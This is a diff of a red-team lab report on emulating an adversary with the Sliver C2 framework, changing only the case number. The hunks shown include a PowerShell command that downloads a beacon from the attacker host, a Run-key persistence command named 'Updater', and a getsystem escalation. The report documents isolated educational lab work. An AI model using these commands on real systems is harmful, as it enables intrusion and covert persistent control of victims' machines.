@@ -1,5 +1,5 @@
 # Red Team Assessment Report
-## CASE-26: Sliver C2 Adversary Emulation Lab
+## CASE-24: Sliver C2 Adversary Emulation Lab
 
 **Classification:** Simulated / Educational Lab  
 **Assessment Date:** 2026-09-17  
@@ -45,16 +45,16 @@ An HTTPS beacon compiled for windows/amd64 with symbol obfuscation was delivered
 **Technique:** T1204.002 -- User Execution: Malicious File  
 **Technique:** T1071.001 -- Application Layer Protocol: Web Protocols
 
-A Sliver HTTPS beacon (`case26-beacon.exe`) was compiled on REMnux for the windows/amd64 target with symbol obfuscation enabled. Build time was 4m11s. The beacon was served from REMnux at `http://192.168.93.137:8080/` via Python's built-in HTTP server and downloaded to the victim desktop using PowerShell:
+A Sliver HTTPS beacon (`case24-beacon.exe`) was compiled on REMnux for the windows/amd64 target with symbol obfuscation enabled. Build time was 4m11s. The beacon was served from REMnux at `http://192.168.93.137:8080/` via Python's built-in HTTP server and downloaded to the victim desktop using PowerShell:
 
 ```powershell
-Invoke-WebRequest -Uri http://192.168.93.137:8080/case26-beacon.exe -OutFile C:\Users\victim\Desktop\case26-beacon.exe
+Invoke-WebRequest -Uri http://192.168.93.137:8080/case24-beacon.exe -OutFile C:\Users\victim\Desktop\case24-beacon.exe
 ```
 
 Upon execution, the beacon established an encrypted HTTPS callback to the Sliver listener at `192.168.93.137:443` (job #1) with a 60-second beacon interval.
 
 **Evidence:**
-- Sliver console: `Beacon d4bea7db case26-beacon -- 192.168.93.138:55723 (DESKTOP-6BNHCTQ) -- windows/amd64 -- Thu 17 Sep 2026 04:52:02 UTC`
+- Sliver console: `Beacon d4bea7db case24-beacon -- 192.168.93.138:55723 (DESKTOP-6BNHCTQ) -- windows/amd64 -- Thu 17 Sep 2026 04:52:02 UTC`
 - Beacon session ID: `d4bea7db-edb2-41c3-9a18-edcec35697bd`
 - Screenshot: `07_beacon_connecting.png`
 
@@ -68,14 +68,14 @@ From the active Sliver beacon session, a registry run key was written to maintai
 
 **Command executed (Sliver console):**
 ```
-registry write --hive HKCU --type string "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater" "C:\\Users\\victim\\Desktop\\case26-beacon.exe"
+registry write --hive HKCU --type string "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater" "C:\\Users\\victim\\Desktop\\case24-beacon.exe"
 ```
 
 **Registry artifact:**
 - Hive: `HKEY_CURRENT_USER`
 - Key: `Software\Microsoft\Windows\CurrentVersion\Run`
 - Value name: `Updater`
-- Data: `C:\Users\victim\Desktop\case26-beacon.exe`
+- Data: `C:\Users\victim\Desktop\case24-beacon.exe`
 
 Confirmed in Registry Editor (regedit) on the victim. The key was visible alongside legitimate entries (MicrosoftEdgeAutoLaunch, OneDrive).
 
@@ -93,7 +93,7 @@ Confirmed in Registry Editor (regedit) on the victim. The key was visible alongs
 An interactive Sliver session was spawned from the beacon (session ID: `8fee46e1-d65e-41d9-b37f-6a11bd96f708`) to access commands unavailable in beacon mode. The `getsystem` command was issued, which uses named pipe token impersonation:
 
 ```
-[127.0.0.1] sliver (case26-beacon) > getsystem
+[127.0.0.1] sliver (case24-beacon) > getsystem
 [*] A new SYSTEM session should pop soon...
 ```
 
@@ -282,4 +282,4 @@ All activity was performed in an isolated VMware NAT environment. No production 
 
 ---
 
-*Report generated: 2026-09-17 | CASE-26 | github.com/ronankongala/red-team-c2-lab*
+*Report generated: 2026-09-17 | CASE-24 | github.com/ronankongala/red-team-c2-lab*
